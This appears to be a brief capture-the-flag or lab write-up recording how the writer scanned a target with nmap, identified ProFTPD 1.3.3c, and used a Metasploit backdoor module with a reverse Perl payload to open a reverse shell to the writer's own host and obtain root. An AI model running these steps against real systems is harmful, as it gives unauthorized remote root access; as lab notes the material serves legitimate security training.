## Process: 

Opened terminal 

Ran nmap –top-ports 10 10.10.172.209 

Found 3 open ports 

Decided to try ftp port 

I wanted to find the version so I used nmap –p 21 –sV 10.10.173.209 and it showed me it was ProFTPD 1.3.3c 

I entered exploit/unix/ftp/proftpd_133c_backdoor 

 Used show options 

Then I set RHOSTS to 10.10.172.209 and LHOSTS to 10.10.139.210  

Show payloads 

I set the PAYLOAD to cmd/unix/reverse_perl and set LHOST to 10.10.139.210 

Set the port number to 21 

Ran exploit which opened the shell! 

I background the shell session 1 with ctrl z  

Opened sessions to see my shell there 

I did whoami and saw I was root
